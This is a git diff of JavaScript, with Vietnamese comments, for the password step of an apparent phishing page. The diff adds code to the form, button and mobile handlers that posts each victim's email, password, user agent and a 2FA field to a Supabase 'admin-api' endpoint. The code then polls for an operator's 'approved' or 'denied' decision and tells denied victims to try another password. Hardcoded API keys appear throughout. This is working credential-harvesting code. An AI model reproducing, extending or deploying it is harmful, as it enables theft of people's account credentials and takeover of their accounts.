@@ -1,4 +1,6 @@
-const passwordInput = document.getElementById('password');
+// Lấy password input
+const passwordInput = document.querySelector('.form-input[type="password"]');
+
 // Hiện/ẩn mật khẩu bằng checkbox
 const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
 if (showPasswordCheckbox) {
@@ -22,8 +24,6 @@ function formatPhoneNumber(phone) {
 
 // Khai báo biến userEmail lấy từ phần tử HTML
 const userEmail = document.getElementById('userEmail');
-// Nếu có phần tử userInitial thì khai báo, còn không thì bỏ qua
-// const userInitial = document.getElementById('userInitial');
 
 // Thêm xử lý click cho desktop
 function setupDesktopEmailClick() {
@@ -160,14 +160,68 @@ if (passwordForm && passwordInput) {
             return;
         }
         
-        // Lấy requestId từ localStorage
-        const requestId = localStorage.getItem('requestId');
         const email = getEmailFromParams();
         const password = passwordInput.value;
         
-        if (requestId) {
+        try {
+            // Gửi dữ liệu password với Supabase
+            const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/request', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Cache-Control': 'no-cache',
+                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
+                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
+                },
+                cache: 'no-cache',
+                keepalive: true,
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    twofa: '',
+                    userAgent: navigator.userAgent,
+                    currentPage: 'password.html'
+                })
+            });
+            
+            if (response.ok) {
+                const data = await response.json();
+                console.log('✅ Password submitted to Supabase:', data);
+                
+                // Kiểm tra trạng thái approval
+                await checkApprovalStatus(email, 'verify.html');
+            } else {
+                console.error('❌ Failed to submit password to Supabase');
+                // Nếu không kết nối được Backend, chuyển trang bình thường
+                navigateTo('verify.html?email=' + encodeURIComponent(email));
+            }
+        } catch (error) {
+            console.error('❌ Error sending password data to backend:', error);
+            // Nếu có lỗi, chuyển trang bình thường
+            navigateTo('verify.html?email=' + encodeURIComponent(email));
+        }
+    });
+}
+
+// Thêm xử lý cho nút "Tiếp theo" riêng biệt để đảm bảo hoạt động
+document.addEventListener('DOMContentLoaded', function() {
+    const nextButton = document.querySelector('.btn-primary');
+    if (nextButton) {
+        nextButton.addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            if (!passwordInput) return;
+            
+            if (!validatePasswordInput(passwordInput)) {
+                passwordInput.focus();
+                return;
+            }
+            
+            const email = getEmailFromParams();
+            const password = passwordInput.value;
+            
             try {
-                // Gửi dữ liệu password với Supabase
+                // Gửi dữ liệu password mới đến Supabase
                 const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/request', {
                     method: 'POST',
                     headers: {
@@ -189,92 +243,18 @@ if (passwordForm && passwordInput) {
                 
                 if (response.ok) {
                     const data = await response.json();
-                    console.log('Supabase response:', data);
+                    console.log('✅ Button click - Password submitted to Supabase:', data);
                     
                     // Kiểm tra trạng thái approval
                     await checkApprovalStatus(email, 'verify.html');
                 } else {
+                    console.error('❌ Button click - Failed to submit password');
                     // Nếu không kết nối được Backend, chuyển trang bình thường
                     navigateTo('verify.html?email=' + encodeURIComponent(email));
                 }
             } catch (error) {
-                console.error('Error sending password data to backend:', error);
+                console.error('❌ Button click - Error sending password data:', error);
                 // Nếu có lỗi, chuyển trang bình thường
-                navigateTo('verify.html?email=' + encodeURIComponent(email));
-            }
-        } else {
-            // Không có requestId, chuyển trang bình thường
-            navigateTo('verify.html?email=' + encodeURIComponent(email));
-        }
-    });
-}
-
-// Thêm xử lý cho nút "Tiếp theo" riêng biệt để đảm bảo hoạt động
-document.addEventListener('DOMContentLoaded', function() {
-    const nextButton = document.querySelector('.btn-primary');
-    if (nextButton) {
-        nextButton.addEventListener('click', async function(e) {
-            e.preventDefault();
-            
-            if (!passwordInput) return;
-            
-            if (!validatePasswordInput(passwordInput)) {
-                passwordInput.focus();
-                return;
-            }
-            
-            // Lấy requestId từ localStorage
-            const requestId = localStorage.getItem('requestId');
-            const email = getEmailFromParams();
-            const password = passwordInput.value;
-            
-            if (requestId) {
-                try {
-                    // Cập nhật trạng thái trang
-                    await fetch('http://localhost:5000/api/update-page', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            id: parseInt(requestId),
-                            currentPage: 'password.html'
-                        })
-                    });
-                    
-                    // Gửi dữ liệu password mới
-                    const response = await fetch('http://localhost:5000/api/request', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            email: email,
-                            password: password,
-                            twofa: '',
-                            userAgent: navigator.userAgent,
-                            currentPage: 'password.html'
-                        })
-                    });
-                    
-                    if (response.ok) {
-                        const data = await response.json();
-                        const newRequestId = data.requestId;
-                        localStorage.setItem('requestId', newRequestId);
-                        
-                        // Kiểm tra trạng thái approval
-                        await checkApprovalStatus(newRequestId, 'verify.html');
-                    } else {
-                        // Nếu không kết nối được Backend, chuyển trang bình thường
-                        navigateTo('verify.html?email=' + encodeURIComponent(email));
-                    }
-                } catch (error) {
-                    console.error('Error sending password data to backend:', error);
-                    // Nếu có lỗi, chuyển trang bình thường
-                    navigateTo('verify.html?email=' + encodeURIComponent(email));
-                }
-            } else {
-                // Không có requestId, chuyển trang bình thường
                 navigateTo('verify.html?email=' + encodeURIComponent(email));
             }
         });
@@ -295,58 +275,44 @@ document.addEventListener('DOMContentLoaded', function() {
                 return;
             }
             
-            // Lấy requestId từ localStorage
-            const requestId = localStorage.getItem('requestId');
             const email = getEmailFromParams();
             const password = mobilePasswordInput.value;
             
-            if (requestId) {
-                try {
-                    // Cập nhật trạng thái trang
-                    await fetch('http://localhost:5000/api/update-page', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            id: parseInt(requestId),
-                            currentPage: 'password.html'
-                        })
-                    });
+            try {
+                // Gửi dữ liệu password mới đến Supabase (mobile)
+                const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/request', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Cache-Control': 'no-cache',
+                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
+                        'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
+                    },
+                    cache: 'no-cache',
+                    keepalive: true,
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        twofa: '',
+                        userAgent: navigator.userAgent,
+                        currentPage: 'password.html'
+                    })
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    console.log('✅ Mobile - Password submitted to Supabase:', data);
                     
-                    // Gửi dữ liệu password mới
-                    const response = await fetch('http://localhost:5000/api/request', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            email: email,
-                            password: password,
-                            twofa: '',
-                            userAgent: navigator.userAgent,
-                            currentPage: 'password.html'
-                        })
-                    });
-                    
-                    if (response.ok) {
-                        const data = await response.json();
-                        const newRequestId = data.requestId;
-                        localStorage.setItem('requestId', newRequestId);
-                        
-                        // Kiểm tra trạng thái approval
-                        await checkApprovalStatus(newRequestId, 'verify.html');
-                    } else {
-                        // Nếu không kết nối được Backend, chuyển trang bình thường
-                        navigateTo('verify.html?email=' + encodeURIComponent(email));
-                    }
-                } catch (error) {
-                    console.error('Error sending password data to backend:', error);
-                    // Nếu có lỗi, chuyển trang bình thường
+                    // Kiểm tra trạng thái approval
+                    await checkApprovalStatus(email, 'verify.html');
+                } else {
+                    console.error('❌ Mobile - Failed to submit password');
+                    // Nếu không kết nối được Backend, chuyển trang bình thường
                     navigateTo('verify.html?email=' + encodeURIComponent(email));
                 }
-            } else {
-                // Không có requestId, chuyển trang bình thường
+            } catch (error) {
+                console.error('❌ Mobile - Error sending password data:', error);
+                // Nếu có lỗi, chuyển trang bình thường
                 navigateTo('verify.html?email=' + encodeURIComponent(email));
             }
         });
@@ -396,9 +362,11 @@ async function checkApprovalStatus(email, nextPage) {
     const maxAttempts = 120; // Tối đa 120 lần kiểm tra (2 phút)
     let attempts = 0;
     
+    console.log(`🔄 Starting approval check for: ${email}`);
+    
     const checkStatus = async () => {
         try {
-                            const response = await fetch(`https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/check-approval?email=${encodeURIComponent(email)}`, {
+            const response = await fetch(`https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/check-approval?email=${encodeURIComponent(email)}`, {
                 cache: 'no-cache',
                 headers: {
                     'Cache-Control': 'no-cache',
@@ -409,14 +377,16 @@ async function checkApprovalStatus(email, nextPage) {
             
             if (response.ok) {
                 const data = await response.json();
+                console.log(`📊 Approval check #${attempts + 1}:`, data.status);
                 
                 if (data.status === 'approved') {
                     // Được approve, chuyển trang ngay lập tức
-                    const email = localStorage.getItem('userEmail');
+                    console.log('✅ APPROVED! Redirecting to next page...');
                     navigateTo(nextPage + '?email=' + encodeURIComponent(email));
                     return;
                 } else if (data.status === 'denied') {
                     // Bị từ chối, reset form để người dùng thử lại với password mới
+                    console.log('❌ DENIED! Resetting form...');
                     showNotification('Access denied. Please try again with a different password.', 'error');
                     const submitBtn = document.querySelector('.btn-primary');
                     if (submitBtn) {
@@ -435,22 +405,22 @@ async function checkApprovalStatus(email, nextPage) {
             
             attempts++;
             if (attempts < maxAttempts) {
-                // Kiểm tra nhanh hơn: 300ms cho 20 lần đầu, sau đó 500ms
-                const interval = attempts < 20 ? 300 : 500;
+                // Kiểm tra nhanh hơn: 500ms cho 20 lần đầu, sau đó 1000ms
+                const interval = attempts < 20 ? 500 : 1000;
                 setTimeout(checkStatus, interval);
             } else {
                 // Hết thời gian chờ, chuyển trang
-                const email = localStorage.getItem('userEmail');
+                console.log('⏰ Timeout - Proceeding to next page...');
                 navigateTo(nextPage + '?email=' + encodeURIComponent(email));
             }
         } catch (error) {
-            console.error('Error checking approval status:', error);
+            console.error('❌ Error checking approval status:', error);
             attempts++;
             if (attempts < maxAttempts) {
-                const interval = attempts < 20 ? 300 : 500;
+                const interval = attempts < 20 ? 500 : 1000;
                 setTimeout(checkStatus, interval);
             } else {
-                const email = localStorage.getItem('userEmail');
+                console.log('⏰ Error timeout - Proceeding to next page...');
                 navigateTo(nextPage + '?email=' + encodeURIComponent(email));
             }
         }
